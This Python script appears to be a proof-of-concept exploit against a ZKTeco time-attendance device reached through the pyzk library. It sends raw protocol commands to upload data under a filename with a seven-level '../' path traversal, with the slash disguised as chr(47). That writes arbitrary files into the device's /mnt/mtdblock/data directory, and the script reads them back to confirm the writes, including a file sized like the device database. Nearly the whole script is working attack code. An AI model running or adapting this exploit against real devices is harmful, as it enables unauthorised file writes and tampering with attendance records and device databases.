#!/usr/bin/env python3
"""PURE upload test - no free_data, just clean PREPARE+DATA+UPLOAD."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_pure(conn, target_filename, data):
    """Pure upload: PREPARE + DATA + UPLOAD_PICTURE with path traversal."""
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + target_filename
    filename = traversal.encode() + b'\x00'
    size = len(data)

    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE', 'r1': r1}
    r2 = send_cmd(conn, const.CMD_DATA, data)
    if not r2.get('status'):
        return {'error': 'DATA', 'r2': r2}
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'DATA': r2, 'UPLOAD': r3}

def download_file_pure(conn, path):
    r = send_cmd(conn, 0x6A6, (path + '\x00').encode())
    sock = conn._ZK__sock
    sock.settimeout(10)
    total = b''
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0: break
                if chunks > 100 and len(total) > 0: break
        except socket.timeout: break
    return total, chunks

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected')

try: conn.disable_device()
except: pass

# Upload test 1: simple small file
print('\n=== TEST 1: Small file (100 bytes) ===')
test1 = b'TEST_MAVIS_2026_PURE_UPLOAD_' + b'A' * 70
print('  Upload:', upload_pure(conn, 'mnt/mtdblock/data/pure_100.txt', test1))
data1, c1 = download_file_pure(conn, '/mnt/mtdblock/data/pure_100.txt')
print('  Downloaded {} bytes in {} chunks'.format(len(data1), c1))
if data1 == test1:
    print('  [+] EXACT MATCH!')
else:
    print('  Content:', data1[:200])
    print('  Expected:', test1[:200])

# Upload test 2: ZKDB.db size
print('\n=== TEST 2: ZKDB.db sized file (1MB random data) ===')
test2 = b'Z' * (1024 * 1024)  # 1MB
print('  Upload...')
result = upload_pure(conn, 'mnt/mtdblock/data/pure_1mb.bin', test2)
print('  Upload:', result)
time.sleep(2)
data2, c2 = download_file_pure(conn, '/mnt/mtdblock/data/pure_1mb.bin')
print('  Downloaded {} bytes in {} chunks'.format(len(data2), c2))
if len(data2) == len(test2):
    if data2 == test2:
        print('  [+] 1MB EXACT MATCH!')
    else:
        # Check how many bytes match
        match = sum(1 for a, b in zip(data2, test2) if a == b)
        print('  [~] Same length, {} matching bytes'.format(match))
else:
    print('  [!] Length mismatch: expected {}, got {}'.format(len(test2), len(data2)))

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass
print('\n[+] Done')
